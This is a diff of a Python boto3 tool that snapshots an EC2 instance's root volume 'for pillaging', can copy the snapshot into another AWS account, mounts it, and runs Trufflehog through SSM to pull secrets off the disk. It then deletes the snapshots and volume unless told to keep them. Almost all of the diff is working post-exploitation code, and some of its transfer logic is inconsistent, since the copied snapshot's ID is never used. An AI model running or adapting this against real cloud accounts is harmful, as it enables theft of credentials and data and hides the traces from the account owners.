@@ -8,34 +8,75 @@ import time
 from botocore.exceptions import ClientError  
 import json
 import re
+from datetime import datetime
 
 # Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 def list_ebs_volumes(ec2_resource):
-    """List all available EBS volumes."""
+    """List all available EBS volumes and snapshots."""
     try:
         volumes = [volume for volume in ec2_resource.volumes.all() if volume.state == 'available']
-        return volumes
+        snapshots = list(ec2_resource.snapshots.filter(OwnerIds=['self']))
+
+        volume_details = []
+        for volume in volumes:
+            volume_info = {
+                'VolumeId': volume.id,
+                'State': volume.state,
+                'Size': volume.size,
+                'SnapshotId': volume.snapshot_id
+            }
+            volume_details.append(volume_info)
+            logging.info(f"EBS Volume ID: {volume.id}, State: {volume.state}, Size: {volume.size} GiB, Snapshot ID: {volume.snapshot_id}")
+
+        snapshot_details = []
+        for snapshot in snapshots:
+            snapshot_info = {
+                'SnapshotId': snapshot.id,
+                'VolumeId': snapshot.volume_id,
+                'State': snapshot.state,
+                'StartTime': snapshot.start_time
+            }
+            snapshot_details.append(snapshot_info)
+            logging.info(f"Snapshot ID: {snapshot.id}, Volume ID: {snapshot.volume_id}, State: {snapshot.state}, Start Time: {snapshot.start_time}")
+
+        return volume_details, snapshot_details
     except Exception as e:
-        logging.error(f"Failed to list EBS volumes: {str(e)}")
-        return []
+        logging.error(f"Failed to list EBS volumes and snapshots: {str(e)}")
+        return [], []
 
 def list_ec2_instances(src_profile, src_region):
-    """List all EC2 instances."""
+    """List all EC2 instances along with their IP addresses."""
     try:
         session = boto3.Session(profile_name=src_profile, region_name=src_region)
         ec2_resource = session.resource('ec2')
         instances = list(ec2_resource.instances.all())
-        return instances
+        
+        instance_details = []
+        for instance in instances:
+            instance_info = {
+                'InstanceId': instance.id,
+                'State': instance.state['Name'],
+                'PublicIpAddress': instance.public_ip_address,
+                'PrivateIpAddress': instance.private_ip_address
+            }
+            instance_details.append(instance_info)
+            #logging.info(f"Instance ID: {instance.id}, State: {instance.state['Name']}, Public IP: {instance.public_ip_address}, Private IP: {instance.private_ip_address}")
+        
+        return instance_details
     except Exception as e:
         logging.error(f"Failed to list EC2 instances: {str(e)}")
         return []
-
-def create_snapshot(ec2_client, instance_id):
+    
+def create_snapshot(ec2_client, instance_id, profile_name, region_name):
     """Create a snapshot of the root volume of the specified EC2 instance."""
-    logging.info("Creating snapshot...")
+    logging.info(f"Creating snapshot for instance {instance_id} using client in region {region_name} and profile {profile_name}")
     try:
+        # Use the provided session for the specified profile and region
+        session = boto3.Session(profile_name=profile_name, region_name=region_name)
+        ec2_client = session.client('ec2')
+
         instance = ec2_client.describe_instances(InstanceIds=[instance_id])
         reservations = instance.get('Reservations', [])
         if not reservations:
@@ -56,42 +97,78 @@ def create_snapshot(ec2_client, instance_id):
         if not src_volume_id:
             raise ValueError(f"No volume ID found for instance {instance_id}")
 
-        snapshot = ec2_client.create_snapshot(VolumeId=src_volume_id, Description='Snapshot for pillaging')
+        snapshot = ec2_client.create_snapshot(
+            VolumeId=src_volume_id,
+            Description='Snapshot for pillaging',
+            TagSpecifications=[{
+                'ResourceType': 'snapshot',
+                'Tags': [{'Key': 'Name', 'Value': 'TrufflehogTesting'}]
+            }]
+        )
         ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot['SnapshotId']])
         
         logging.info(f"Snapshot {snapshot['SnapshotId']} created successfully.")
         return snapshot['SnapshotId']
 
     except Exception as e:
-        logging.error(f"Failed to create snapshot: {str(e)}")
+        logging.error(f"Failed to create snapshot for instance {instance_id}: {str(e)}")
         return None
 
-def transfer_snapshot(src_profile, dst_profile, snapshot_id):
-    # Create AWS session for source and destination profiles
-    src_session = boto3.Session(profile_name=src_profile)
-    dst_session = boto3.Session(profile_name=dst_profile)
-    
-    # Get the account IDs associated with the profiles
-    src_account_id = src_session.client('sts').get_caller_identity()['Account']
-    dst_account_id = dst_session.client('sts').get_caller_identity()['Account']
-    
-    # Check if the source and destination accounts are the same
-    if src_account_id == dst_account_id:
-        print("Source and destination accounts are the same. Skipping snapshot transfer.")
-        return
-    
-    # Transfer snapshot from source to destination
-    ec2_src = src_session.resource('ec2')
-    snapshot = ec2_src.Snapshot(snapshot_id)
-    
-    ec2_dst = dst_session.resource('ec2')
-    snapshot.copy(
-        SourceRegion=snapshot.meta.data['Region'],
-        SourceSnapshotId=snapshot_id,
-        DestinationRegion=snapshot.meta.data['Region'],
-        DestinationAccountId=dst_account_id
-    )
-    print(f"Snapshot {snapshot_id} transferred from {src_profile} to {dst_profile}.")
+def transfer_snapshot(src_profile, dst_profile, src_region, dst_region, snapshot_id):
+    """Transfer EBS snapshot from source account to destination account."""
+    def json_serialize(obj):
+        """JSON serializer for objects not serializable by default json code"""
+        if isinstance(obj, datetime):
+            return obj.isoformat()
+        raise TypeError("Type not serializable")
+
+    try:
+        src_session = boto3.Session(profile_name=src_profile, region_name=src_region)
+        dst_session = boto3.Session(profile_name=dst_profile, region_name=dst_region)
+
+        src_account_id = src_session.client('sts').get_caller_identity()['Account']
+        dst_account_id = dst_session.client('sts').get_caller_identity()['Account']
+
+        if src_account_id == dst_account_id:
+            logging.info("Source and destination accounts are the same. Skipping snapshot transfer.")
+            return snapshot_id
+
+        ec2_src = src_session.client('ec2')
+        ec2_dst = dst_session.client('ec2')
+
+        response = ec2_src.describe_snapshots(SnapshotIds=[snapshot_id])
+        source_snapshot = response['Snapshots'][0]
+
+        # Log the source_snapshot details with custom JSON serialization for datetime objects
+        logging.info(f"Source snapshot details: {json.dumps(source_snapshot, default=json_serialize, indent=4)}")
+
+        # Extract the region from the source snapshot
+        source_region = src_region  # Use the provided src_region directly
+
+        # Log the command being run
+        logging.info(f"Running command: ec2_dst.copy_snapshot("
+                     f"SourceSnapshotId={snapshot_id}, "
+                     f"SourceRegion={source_region}, "
+                     f"DestinationRegion={dst_region}, "
+                     f"DestinationAccountId={dst_account_id})")
+
+        copied_snapshot = ec2_dst.copy_snapshot(
+            SourceSnapshotId=snapshot_id,
+            SourceRegion=source_region,
+            DestinationRegion=dst_region,
+            TagSpecifications=[{
+                'ResourceType': 'snapshot',
+                'Tags': [{'Key': 'Name', 'Value': 'TrufflehogTesting'}]
+            }]
+        )
+
+        logging.info(f"Snapshot {copied_snapshot['SnapshotId']} transferred from {src_profile} to {dst_profile}.")
+        return copied_snapshot['SnapshotId']  # Return the new snapshot ID
+
+    except Exception as e:
+        logging.error(f"Snapshot transfer failed: {str(e)}")
+        return None
+
 
 def find_available_device(ec2_client, instance_id):
     """Find an available device name on the EC2 instance."""
@@ -113,9 +190,9 @@ def find_available_device(ec2_client, instance_id):
         logging.error(f"Failed to find available device: {str(e)}")
         return None
 
-def create_volume(ec2_client, snapshot_id, instance_id):
+def create_volume(ec2_client, snapshot_id, instance_id, is_src_profile=True):
     """Create a new EBS volume from the specified snapshot in the availability zone of the EC2 instance."""
-    logging.info("Creating volume from snapshot...")
+    logging.info(f"Creating volume from snapshot {snapshot_id} in the {'source' if is_src_profile else 'destination'} account...")
     try:
         # Fetch the availability zone of the EC2 instance
         instance = ec2_client.describe_instances(InstanceIds=[instance_id])
@@ -130,7 +207,14 @@ def create_volume(ec2_client, snapshot_id, instance_id):
         availability_zone = instances[0]['Placement']['AvailabilityZone']
 
         # Create the volume using the correct availability zone
-        volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone)
+        volume = ec2_client.create_volume(
+            SnapshotId=snapshot_id,
+            AvailabilityZone=availability_zone,
+            TagSpecifications=[{
+                'ResourceType': 'volume',
+                'Tags': [{'Key': 'Name', 'Value': 'TrufflehogTesting'}]
+            }]
+        )
         dst_volume_id = volume['VolumeId']  # Updated to capture the correct volume ID
 
         # Wait for the volume to become available
@@ -152,6 +236,7 @@ def create_volume(ec2_client, snapshot_id, instance_id):
     except Exception as e:
         logging.error(f"Failed to create volume from snapshot: {str(e)}")
         return None
+
 
 def delete_snapshot_and_volume(ec2_client, src_snapshot_id, dst_snapshot_id, dst_volume_id, retain=False):
     """Delete the specified snapshots and EBS volume."""
@@ -182,8 +267,6 @@ def delete_snapshot_and_volume(ec2_client, src_snapshot_id, dst_snapshot_id, dst
             logging.info(f"Retaining snapshots {src_snapshot_id} and {dst_snapshot_id}.")
     except Exception as e:
         logging.error(f"Failed to delete volume or snapshots: {str(e)}")
-
-
 
 def find_attached_volumes(instance_id, ssm_client):
     """Find attached NVMe volumes for the specified EC2 instance using SSM."""
@@ -303,7 +386,13 @@ def mount_ebs_volume(instance_id, volume_id, ssh_key_path, mount_path, profile_n
 def install_trufflehog_ssm(instance_id, ssm_client):
     try:
         # SSM command to install Trufflehog
-        install_command = "sudo apt update && sudo apt install -y wget && wget https://github.com/trufflesecurity/trufflehog/releases/download/v3.75.0/trufflehog_3.75.0_linux_amd64.tar.gz -O /tmp/trufflehog.tar.gz && tar xzf /tmp/trufflehog.tar.gz -C /tmp/"
+        install_command = """
+            sudo apt update && sudo apt install -y wget && \
+            wget https://github.com/trufflesecurity/trufflehog/releases/download/v3.75.0/trufflehog_3.75.0_linux_amd64.tar.gz -O /tmp/trufflehog.tar.gz && \
+            tar xzf /tmp/trufflehog.tar.gz -C /tmp/ && \
+            chmod +x /tmp/trufflehog && \
+            ls -lah /tmp/trufflehog
+        """
 
         # Send the install command to the instance
         response = ssm_client.send_command(
@@ -408,6 +497,7 @@ def stream_command_output(ssm_client, command_id, instance_id):
                 file.write(final_output['StandardOutputContent'])
             # Check if trufflehog.out is not empty and print its content
             file_path = '/tmp/trufflehog.out'
+            """
             if os.path.getsize(file_path) > 0:
                 with open(file_path, 'r') as file:
                     content = file.read()
@@ -418,6 +508,7 @@ def stream_command_output(ssm_client, command_id, instance_id):
                         logging.error("trufflehog.out content is empty or contains only whitespace.")
             else:
                 logging.error("trufflehog.out is empty.")
+            """
 
         if 'StandardErrorContent' in final_output:
             logging.error(f"Final SSM stderr: {final_output['StandardErrorContent']}")
@@ -464,57 +555,91 @@ def save_trufflehog_output(instance_id, ssm_client, out_file):
 
 def main(src_profile, dst_profile, src_region, dst_region, list_ebs, list_ec2, mount_host, pillage, target_ec2, pillage_path, mount_path, ssh_key_path, retain=False, json_output=False, out_file=None, transfer=False):
     """Main function to handle AWS resources."""
-    session = boto3.Session(profile_name=src_profile, region_name=src_region)
-    ec2_client = session.client('ec2')
-    ssm_client = session.client('ssm')
+    
+    logging.debug(f"Initializing AWS sessions:")
+    logging.debug(f"Source Profile: {src_profile}, Region: {src_region}")
+    logging.debug(f"Destination Profile: {dst_profile}, Region: {dst_region}")
+
+    session_src = boto3.Session(profile_name=src_profile, region_name=src_region)
+    session_dst = boto3.Session(profile_name=dst_profile, region_name=dst_region)
+    ec2_client_src = session_src.client('ec2')
+    ec2_client_dst = session_dst.client('ec2')
+    ec2_resource_dst = session_dst.resource('ec2')
+    ssm_client_dst = session_dst.client('ssm')
 
     if list_ebs:
-        volumes = list_ebs_volumes(ec2_client)
+        logging.debug("Listing EBS volumes in the destination account:")
+        volumes, snapshots = list_ebs_volumes(ec2_resource_dst)
         for volume in volumes:
-            logging.info(f'EBS Volume ID: {volume.volume_id}')
-        return  # Exit after listing EBS volumes
+            logging.info(f'EBS Volume ID: {volume["VolumeId"]}, State: {volume["State"]}, Size: {volume["Size"]} GiB, Snapshot ID: {volume["SnapshotId"]}')
+        for snapshot in snapshots:
+            logging.info(f'Snapshot ID: {snapshot["SnapshotId"]}, Volume ID: {snapshot["VolumeId"]}, State: {snapshot["State"]}, Start Time: {snapshot["StartTime"]}')
+        return  # Exit after listing EBS volumes and snapshots
 
     if list_ec2:
+        logging.debug("Listing EC2 instances in the source account:")
         instances = list_ec2_instances(src_profile, src_region)
         for instance in instances:
-            logging.info(f'Instance ID: {instance.id}, State: {instance.state["Name"]}')
+            logging.info(f'Instance ID: {instance["InstanceId"]}, State: {instance["State"]}, Public IP: {instance["PublicIpAddress"]}, Private IP: {instance["PrivateIpAddress"]}')
         return  # Exit after listing EC2 instances
 
+    if transfer:
+        logging.debug(f"Verifying target EC2 instance {target_ec2} in the source account {src_profile}:")
+        # Validate that target_ec2 is in the source account
+        try:
+            instance = ec2_client_src.describe_instances(InstanceIds=[target_ec2])
+            reservations = instance.get('Reservations', [])
+            if not reservations:
+                raise ValueError(f"No reservations found for instance {target_ec2} in source account {src_profile}")
+            
+            logging.info(f"Target EC2 instance {target_ec2} verified in source account {src_profile}.")
+        except Exception as e:
+            logging.error(f"Failed to verify target EC2 instance in source account: {str(e)}")
+            return
+
     if pillage and mount_host and target_ec2:
-        snapshot_id = create_snapshot(ec2_client, target_ec2)
+        logging.debug(f"Creating snapshot for target EC2 instance {target_ec2} in the source account {src_profile}:")
+        snapshot_id = create_snapshot(ec2_client_src, target_ec2, src_profile, src_region)
         if snapshot_id:
             if src_profile != dst_profile and transfer:
-                snapshot_id = transfer_snapshot(src_profile, dst_profile, snapshot_id)
-
-            if snapshot_id:
-                dst_volume_id = create_volume(ec2_client, snapshot_id, target_ec2)
-                if dst_volume_id:
-                    logging.info(f'Volume {dst_volume_id} created and attached to instance {target_ec2}.')
-
-                    mount_point = mount_ebs_volume(target_ec2, dst_volume_id, ssh_key_path, mount_path, src_profile, src_region)
-                    if mount_point:
-                        logging.info(f'Volume {dst_volume_id} mounted to {mount_point}')
-
-                        status = run_trufflehog_ssm(target_ec2, mount_point, pillage_path, ssh_key_path, ssm_client, json_output=json_output)
-                        if status == 'Success':
-                            if out_file:
-                                save_trufflehog_output(target_ec2, ssm_client, out_file)
-                            if not retain:
-                                delete_snapshot_and_volume(ec2_client, snapshot_id, snapshot_id, dst_volume_id)  # Pass snapshot_id and dst_volume_id correctly
-                            else:
-                                logging.info("Volume and snapshot retained.")
-                        else:
-                            logging.error("Trufflehog execution failed.")
-                    else:
-                        print("Failed to mount volume.")
-                else:
-                    print("Failed to create volume.")
+                logging.debug(f"Transferring snapshot {snapshot_id} from {src_profile} to {dst_profile}")
+                transfer_snapshot(src_profile, dst_profile, src_region, dst_region, snapshot_id)
+                # Now use the destination profile to create the volume
+                logging.debug(f"Creating volume from snapshot {snapshot_id} in the source account {src_profile}")
+                dst_volume_id = create_volume(ec2_client_src, snapshot_id, target_ec2, is_src_profile=True)
             else:
-                print("Snapshot transfer failed.")
+                logging.debug(f"Creating volume from snapshot {snapshot_id} in the source account {src_profile}")
+                dst_volume_id = create_volume(ec2_client_src, snapshot_id, target_ec2, is_src_profile=True)
+
+            if dst_volume_id:
+                logging.info(f'Volume {dst_volume_id} created in the source account and attached to instance {target_ec2}.')
+
+                logging.debug(f"Mounting EBS volume {dst_volume_id} on instance {mount_host} in the {'source' if src_profile == dst_profile else 'destination'} account")
+                mount_point = mount_ebs_volume(mount_host, dst_volume_id, ssh_key_path, mount_path, dst_profile if src_profile != dst_profile else src_profile, dst_region if src_profile != dst_profile else src_region)
+                if mount_point:
+                    logging.info(f'Volume {dst_volume_id} mounted to {mount_point}')
+
+                    logging.debug(f"Running Trufflehog on mounted volume at {mount_point}")
+                    status = run_trufflehog_ssm(mount_host, mount_point, pillage_path, ssh_key_path, ssm_client_dst, json_output=json_output)
+                    if status == 'Success':
+                        if out_file:
+                            logging.debug(f"Saving Trufflehog output to {out_file}")
+                            save_trufflehog_output(mount_host, ssm_client_dst, out_file)
+                        if not retain:
+                            logging.debug(f"Deleting snapshot and volume after processing")
+                            delete_snapshot_and_volume(ec2_client_src, snapshot_id, snapshot_id, dst_volume_id)
+                        else:
+                            logging.info("Volume and snapshot retained.")
+                    else:
+                        logging.error("Trufflehog execution failed.")
+                else:
+                    logging.error("Failed to mount volume.")
+            else:
+                logging.error("Failed to create volume.")
         else:
-            print("Failed to create snapshot.")
+            logging.error("Failed to create snapshot.")
     else:
-        print("Not all necessary parameters provided for pillaging.")
+        logging.error("Not all necessary parameters provided for pillaging.")
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='Process EBS volumes and enumerate EC2 instances.')
